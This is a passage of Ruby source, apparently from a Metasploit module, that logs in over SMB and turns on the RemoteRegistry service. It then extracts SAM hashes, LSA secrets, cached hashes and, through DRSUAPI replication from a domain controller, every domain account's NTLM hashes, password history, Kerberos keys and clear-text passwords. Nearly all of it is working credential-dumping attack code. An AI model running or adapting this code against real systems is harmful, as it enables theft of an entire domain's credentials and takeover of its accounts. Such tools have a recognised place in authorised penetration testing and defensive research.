lookup_table['userPrincipalName']\n        result[:domain_name] = attribute_value.force_encoding('utf-16le').split('@'.encode('utf-16le')).last.encode('utf-8')\n      when lookup_table['sAMAccountName']\n        result[:username] = attribute_value.force_encoding('utf-16le').encode('utf-8')\n      when lookup_table['objectSid']\n        result[:object_sid] = attribute_value\n      when lookup_table['userAccountControl']\n        user_account_control = attribute_value.unpack('L<')[0]\n        result[:disabled] = user_account_control & RubySMB::Dcerpc::Samr::UF_ACCOUNTDISABLE != 0\n        result[:computer_account] = user_account_control & RubySMB::Dcerpc::Samr::UF_NORMAL_ACCOUNT == 0\n        result[:password_never_expires] = user_account_control & RubySMB::Dcerpc::Samr::UF_DONT_EXPIRE_PASSWD != 0\n        result[:password_not_required] = user_account_control & RubySMB::Dcerpc::Samr::UF_PASSWD_NOTREQD != 0\n      when lookup_table['pwdLastSet']\n        result[:pwd_last_set] = Time.at(0)\n        time_value = attribute_value.unpack('Q<')[0]\n        if time_value > 0\n          result[:pwd_last_set] = RubySMB::Field::FileTime.new(time_value).to_time.utc\n        end\n      when lookup_table['lastLogonTimestamp']\n        result[:last_logon] = Time.at(0)\n        time_value = attribute_value.unpack('Q<')[0]\n        if time_value > 0\n          result[:last_logon] = RubySMB::Field::FileTime.new(time_value).to_time.utc\n        end\n      when lookup_table['accountExpires']\n        result[:expires] = Time.at(0)\n        time_value = attribute_value.unpack('Q<')[0]\n        if time_value > 0 && time_value != 0x7FFFFFFFFFFFFFFF\n          result[:expires] = RubySMB::Field::FileTime.new(time_value).to_time.utc\n        end\n      when lookup_table['lmPwdHistory']\n        tmp_lm_history = dcerpc_client.decrypt_attribute_value(attribute_value)\n        tmp_lm_history.bytes.each_slice(16) do |block|\n          result[:lm_history] << dcerpc_client.remove_des_layer(block.map(&:chr).join, rid)\n        end\n      when lookup_table['ntPwdHistory']\n        tmp_nt_history = dcerpc_client.decrypt_attribute_value(attribute_value)\n        tmp_nt_history.bytes.each_slice(16) do |block|\n          result[:nt_history] << dcerpc_client.remove_des_layer(block.map(&:chr).join, rid)\n        end\n      when lookup_table['supplementalCredentials']\n        decrypt_supplemental_info(dcerpc_client, result, attribute_value)\n      end\n    end\n\n    result\n  end\n\n  def dump_ntds_hashes\n    _machine_name, domain_name, dns_domain_name = get_machine_name_and_domain_info\n    return unless domain_name\n\n    print_status('Dumping Domain Credentials (domain\\\\uid:rid:lmhash:nthash)')\n    print_status('Using the DRSUAPI method to get NTDS.DIT secrets')\n\n    begin\n      connect_samr(domain_name)\n    rescue RubySMB::Error::RubySMBError => e\n      print_error(\n        \"Unable to connect to the remote Security Account Manager (SAM) ([#{e.class}] #{e}). \"\\\n        'Is the remote server a Domain Controller?'\n      )\n      return\n    end\n    users = get_domain_users\n\n    dcerpc_client = connect_drs\n    ph_drs = dcerpc_client.drs_bind\n    dc_infos = dcerpc_client.drs_domain_controller_info(ph_drs, domain_name)\n    user_info = {}\n    dc_infos.each do |dc_info|\n      users.each do |sid, _name|\n        crack_names = dcerpc_client.drs_crack_names(ph_drs, rp_names: [sid])\n        crack_names.each do |crack_name|\n          user_record = dcerpc_client.drs_get_nc_changes(\n            ph_drs,\n            nc_guid: crack_name.p_name.to_s.encode('utf-8'),\n            dsa_object_guid: dc_info.ntds_dsa_object_guid\n          )\n          user_info[sid] = parse_user_record(dcerpc_client, user_record)\n        end\n\n        groups = get_user_groups(sid)\n        groups.each do |group|\n          case group.name\n          when 'BUILTIN\\\\Administrators'\n            user_info[sid][:admin] = true\n          when '(domain)\\\\Domain Admins'\n            user_info[sid][:domain_admin] = true\n          when '(domain)\\\\Enterprise Admins'\n            user_info[sid][:enterprise_admin] = true\n          end\n        end\n      end\n    end\n\n    credential_opts = {\n      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n      realm_value: dns_domain_name\n    }\n\n    print_line('# SID\\'s:')\n    user_info.each do |sid, info|\n      full_name = info[:domain_name].blank? ? info[:username] : \"#{info[:domain_name]}\\\\#{info[:username]}\"\n      print_line(\"#{full_name}: #{sid}\")\n    end\n\n    print_line(\"\\n# NTLM hashes:\")\n    user_info.each do |_sid, info|\n      hash = \"#{info[:lm_hash].unpack('H*')[0]}:#{info[:nt_hash].unpack('H*')[0]}\"\n      full_name = info[:domain_name].blank? ? info[:username] : \"#{info[:domain_name]}\\\\#{info[:username]}\"\n      unless report_creds(full_name, hash, **credential_opts)\n        vprint_bad(\"Error when reporting #{full_name} hash\")\n      end\n      print_line(\"#{full_name}:#{info[:rid]}:#{hash}:::\")\n    end\n\n    print_line(\"\\n# Full pwdump format:\")\n    user_info.each do |sid, info|\n      hash = \"#{info[:lm_hash].unpack('H*')[0]}:#{info[:nt_hash].unpack('H*')[0]}\"\n      full_name = info[:domain_name].blank? ? info[:username] : \"#{info[:domain_name]}\\\\#{info[:username]}\"\n      pwdump = \"#{full_name}:#{info[:rid]}:#{hash}:\"\n      extra_info = \"Disabled=#{info[:disabled].nil? ? 'N/A' : info[:disabled]},\"\n      extra_info << \"Expired=#{!info[:disabled] && info[:expires] && info[:expires] > Time.at(0) && info[:expires] < Time.now},\"\n      extra_info << \"PasswordNeverExpires=#{info[:password_never_expires].nil? ? 'N/A' : info[:password_never_expires]},\"\n      extra_info << \"PasswordNotRequired=#{info[:password_not_required].nil? ? 'N/A' : info[:password_not_required]},\"\n      extra_info << \"PasswordLastChanged=#{info[:pwd_last_set] && info[:pwd_last_set] > Time.at(0) ? info[:pwd_last_set].strftime('%Y%m%d%H%M') : 'never'},\"\n      extra_info << \"LastLogonTimestamp=#{info[:last_logon] && info[:last_logon] > Time.at(0) ? info[:last_logon].strftime('%Y%m%d%H%M') : 'never'},\"\n      extra_info << \"IsAdministrator=#{info[:admin]},\"\n      extra_info << \"IsDomainAdmin=#{info[:domain_admin]},\"\n      extra_info << \"IsEnterpriseAdmin=#{info[:enterprise_admin]}\"\n      print_line(pwdump + extra_info + '::')\n      report_info(\"#{full_name} (#{sid}): #{extra_info}\", 'user.info')\n    end\n\n    print_line(\"\\n# Account Info:\")\n    user_info.each do |_sid, info|\n      print_line(\"## #{info[:dn]}\")\n      print_line(\"- Administrator: #{info[:admin]}\")\n      print_line(\"- Domain Admin: #{info[:domain_admin]}\")\n      print_line(\"- Enterprise Admin: #{info[:enterprise_admin]}\")\n      print_line(\"- Password last changed: #{info[:pwd_last_set] && info[:pwd_last_set] > Time.at(0) ? info[:pwd_last_set] : 'never'}\")\n      print_line(\"- Last logon: #{info[:last_logon] && info[:last_logon] > Time.at(0) ? info[:last_logon] : 'never'}\")\n      print_line(\"- Account disabled: #{info[:disabled].nil? ? 'N/A' : info[:disabled]}\")\n      print_line(\"- Computer account: #{info[:computer_account].nil? ? 'N/A' : info[:computer_account]}\")\n\n      print_line(\"- Expired: #{!info[:disabled] && info[:expires] && info[:expires] > Time.at(0) && info[:expires] < Time.now}\")\n      print_line(\"- Password never expires: #{info[:password_never_expires].nil? ? 'N/A' : info[:password_never_expires]}\")\n      print_line(\"- Password not required: #{info[:password_not_required].nil? ? 'N/A' : info[:password_not_required]}\")\n    end\n\n    print_line(\"\\n# Password history (pwdump format - uid:rid:lmhash:nthash:::):\")\n    if @lm_hash_not_stored.nil?\n      print_warning(\n        'NoLMHash policy was not retrieved correctly and we don\\'t know if '\\\n        'LMHashes are being stored or not. We are assuming it is stored and '\\\n        'the lmhash value will be displayed in the following hash. If it is '\\\n        \"not stored, just replace it with the empty lmhash (#{Net::NTLM.lm_hash('').unpack('H*')[0]})\"\n      )\n    end\n    user_info.each do |_sid, info|\n      full_name = info[:domain_name].blank? ? info[:username] : \"#{info[:domain_name]}\\\\#{info[:username]}\"\n\n      if info[:nt_history].size > 1 || info[:lm_history].size > 1\n        info[:nt_history][1..].zip(info[:lm_history][1..]).reverse.each_with_index do |history, i|\n          nt_h, lm_h = history\n          lm_h = Net::NTLM.lm_hash('') if lm_h.nil? || @lm_hash_not_stored\n          history_hash = \"#{lm_h.unpack('H*')[0]}:#{nt_h.unpack('H*')[0]}\"\n          history_name = \"#{full_name}_history#{i}\"\n          unless report_creds(history_name, history_hash, **credential_opts)\n            vprint_bad(\"Error when reporting #{full_name} history hash ##{i}\")\n          end\n          print_line(\"#{history_name}:#{info[:rid]}:#{history_hash}:::\")\n        end\n      else\n        vprint_line(\"No password history for #{full_name}\")\n      end\n    end\n\n    print_line(\"\\n# Kerberos keys:\")\n    user_info.each do |_sid, info|\n      full_name = info[:domain_name].blank? ? info[:username] : \"#{info[:domain_name]}\\\\#{info[:username]}\"\n\n      if info[:kerberos_keys].nil? || info[:kerberos_keys].empty?\n        vprint_line(\"No Kerberos keys for #{full_name}\")\n      else\n        credential_opts[:type] = :krb_enc_key\n        info[:kerberos_keys].each do |key|\n          krb_enckey = {\n            **key,\n            # Map the SAMR kerberos key to an IANA compatible enctype before persisting\n            enctype: SAMR_KERBEROS_TYPE_TO_IANA[key[:enctype]]\n          }\n\n          krb_enckey_to_s = krb_enc_key_to_s(krb_enckey)\n          key_data = Metasploit::Credential::KrbEncKey.build_data(**krb_enckey)\n          unless report_creds(full_name, key_data, **credential_opts)\n            vprint_bad(\"Error when reporting #{full_name} kerberos key #{krb_enckey_to_s}\")\n          end\n          print_line \"#{full_name}:#{krb_enckey_to_s}\"\n        end\n      end\n    end\n\n    print_line(\"\\n# Clear text passwords:\")\n    user_info.each do |_sid, info|\n      full_name = \"#{domain_name}\\\\#{info[:username]}\"\n\n      if info[:clear_text_passwords].nil? || info[:clear_text_passwords].empty?\n        vprint_line(\"No clear text passwords for #{full_name}\")\n      else\n        credential_opts[:type] = :password\n        info[:clear_text_passwords].each do |passwd|\n          unless report_creds(full_name, passwd, **credential_opts)\n            vprint_bad(\"Error when reporting #{full_name} clear text password\")\n          end\n          print_line(\"#{full_name}:CLEARTEXT:#{passwd}\")\n        end\n      end\n    end\n  ensure\n    @samr.close_handle(@domain_handle) if @domain_handle\n    @samr.close_handle(@builtin_domain_handle) if @builtin_domain_handle\n    @samr.close_handle(@server_handle) if @server_handle\n    @samr.close if @samr\n    if dcerpc_client\n      dcerpc_client.drs_unbind(ph_drs)\n      dcerpc_client.close\n    end\n  end\n\n  def do_cleanup\n    print_status('Cleaning up...')\n    if @service_should_be_stopped\n      print_status('Stopping service RemoteRegistry...')\n      svc_handle = @svcctl.open_service_w(@scm_handle, 'RemoteRegistry')\n      @svcctl.control_service(svc_handle, RubySMB::Dcerpc::Svcctl::SERVICE_CONTROL_STOP)\n    end\n\n    if @service_should_be_disabled\n      print_status('Disabling service RemoteRegistry...')\n      @svcctl.change_service_config_w(svc_handle, start_type: RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED)\n    end\n  rescue RubySMB::Dcerpc::Error::SvcctlError => e\n    vprint_warning(\"An error occured when cleaning up: #{e}\")\n  ensure\n    @svcctl.close_service_handle(svc_handle) if svc_handle\n  end\n\n  def open_sc_manager\n    vprint_status('Opening Service Control Manager')\n    @svcctl = @tree.open_file(filename: 'svcctl', write: true, read: true)\n\n    vprint_status('Binding to \\\\svcctl...')\n    @svcctl.bind(endpoint: RubySMB::Dcerpc::Svcctl)\n    vprint_good('Bound to \\\\svcctl')\n\n    @svcctl.open_sc_manager_w(sock.peerhost)\n  end\n\n  def run\n    unless db\n      print_warning('Cannot find any active database. Extracted data will only be displayed here and NOT stored.')\n    end\n\n    connect\n    begin\n      smb_login\n    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e\n      fail_with(Module::Failure::NoAccess,\n                \"Unable to authenticate ([#{e.class}] #{e}).\")\n    end\n    report_service(\n      host: rhost,\n      port: rport,\n      host_name: simple.client.default_name,\n      proto: 'tcp',\n      name: 'smb',\n      info: \"Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})\"\n    )\n\n    begin\n      @tree = simple.client.tree_connect(\"\\\\\\\\#{sock.peerhost}\\\\IPC$\")\n    rescue RubySMB::Error::RubySMBError => e\n      fail_with(Module::Failure::Unreachable,\n                \"Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).\")\n    end\n\n    begin\n      @scm_handle = open_sc_manager\n    rescue RubySMB::Error::RubySMBError => e\n      print_warning(\n        'Unable to connect to the remote Service Control Manager. It will fail '\\\n        \"if the 'RemoteRegistry' service is stopped or disabled ([#{e.class}] #{e}).\"\n      )\n    end\n\n    begin\n      enable_registry if @scm_handle\n    rescue RubySMB::Error::RubySMBError => e\n      print_error(\n        \"Error when checking/enabling the 'RemoteRegistry' service. It will \"\\\n        \"fail if it is stopped or disabled ([#{e.class}] #{e}).\"\n      )\n    end\n\n    begin\n      @winreg = @tree.open_file(filename: 'winreg', write: true, read: true)\n      @winreg.bind(endpoint: RubySMB::Dcerpc::Winreg)\n    rescue RubySMB::Error::RubySMBError => e\n      if ['DOMAIN', 'ALL'].include?(action.name)\n        print_warning(\n          \"Error when connecting to 'winreg' interface ([#{e.class}] #{e})... skipping\"\n        )\n      else\n        fail_with(Module::Failure::Unreachable,\n                  \"Error when connecting to 'winreg' interface ([#{e.class}] #{e}).\"\\\n                  'If it is a Domain Controller, you can still try DOMAIN action since '\\\n                  'it does not need RemoteRegistry')\n      end\n    end\n\n    unless action.name == 'DOMAIN'\n      boot_key = ''\n      begin\n        boot_key = get_boot_key if @winreg\n      rescue RubySMB::Error::RubySMBError => e\n        if ['DOMAIN', 'ALL'].include?(action.name)\n          print_warning(\"Error when getting BootKey... skipping: #{e}\")\n        else\n          print_error(\"Error when getting BootKey: #{e}\")\n        end\n      end\n      if boot_key.empty?\n        if action.name == 'ALL'\n          print_warning('Unable to get BootKey... skipping')\n        else\n          fail_with(Module::Failure::NotFound,\n                    'Unable to get BootKey. If it is a Domain Controller, you can still '\\\n                    'try DOMAIN action since it does not need BootKey')\n        end\n      end\n      report_info(boot_key.unpack('H*')[0], 'host.boot_key')\n    end\n\n    check_lm_hash_not_stored if @winreg\n\n    if ['ALL', 'SAM'].include?(action.name)\n      begin\n        sam = save_sam\n      rescue RubySMB::Error::RubySMBError => e\n        if action.name == 'ALL'\n          print_warning(\"Error when getting SAM hive... skipping ([#{e.class}] #{e}).\")\n        else\n          print_error(\"Error when getting SAM hive ([#{e.class}] #{e}).\")\n        end\n        sam = nil\n      end\n\n      if sam\n        reg_parser = Msf::Util::WindowsRegistry.parse(sam, name: :sam)\n        dump_sam_hashes(reg_parser, boot_key)\n      end\n    end\n\n    if ['ALL', 'CACHE', 'LSA'].include?(action.name)\n      begin\n        security = save_security\n      rescue RubySMB::Error::RubySMBError => e\n        if action.name == 'ALL'\n          print_warning(\"Error when getting SECURITY hive... skipping ([#{e.class}] #{e}).\")\n        else\n          print_error(\"Error when getting SECURITY hive ([#{e.class}] #{e}).\")\n        end\n        security = nil\n      end\n\n      if security\n        reg_parser = Msf::Util::WindowsRegistry.parse(security, name: :security)\n        lsa_key = get_lsa_secret_key(reg_parser, boot_key)\n        if lsa_key.nil? || lsa_key.empty?\n          print_status('No LSA key, skip LSA secrets and cached hashes dump')\n        else\n          report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')\n          if ['ALL', 'LSA'].include?(action.name)\n            dump_lsa_secrets(reg_parser, lsa_key)\n          end\n          if ['ALL', 'CACHE'].include?(action.name)\n            nlkm_key = get_nlkm_secret_key(reg_parser, lsa_key)\n            if nlkm_key.nil? || nlkm_key.empty?\n              print_status('No NLKM key (skip cached hashes dump)')\n            else\n              report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')\n              dump_cached_hashes(reg_parser, nlkm_key)\n            end\n          end\n        end\n      end\n    end\n\n    if ['ALL', 'DOMAIN'].include?(action.name)\n      dump_ntds_hashes\n    end\n\n    do_cleanup\n  rescue RubySMB::Error::RubySMBError => e\n    fail_with(Module::Failure::UnexpectedReply, \"[#{e.class}] #{e}\")\n  rescue Rex::ConnectionError => e\n    fail_with(Module::Failure::Unreachable, \"[#{e.class}] #{e}\")\n  rescue ::StandardError => e\n    do_cleanup\n    raise e\n  ensure\n    if @svcctl\n      @svcctl.close_service_handle(@scm_handle) if @scm_handle\n      @svcctl.close\n    end\n    @winreg.close if @winreg\n    @tree.disconnect! if @tree\n    simple.client.disconnect! if simple&.client.is_a?(RubySMB::Client)\n    disconnect\n  end\n\n  private\n\n  # @param [Hash] data The keyberos enc key, containing enctype, key and salt\n  def krb_enc_key_to_s(data)\n    enctype_name = Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES[data[:enctype]] || \"0x#{data[:enctype].to_i.to_s(16)}\"\n    \"#{enctype_name}:#{data[:key].unpack1('H*')}\"\n  end\nend\n"
}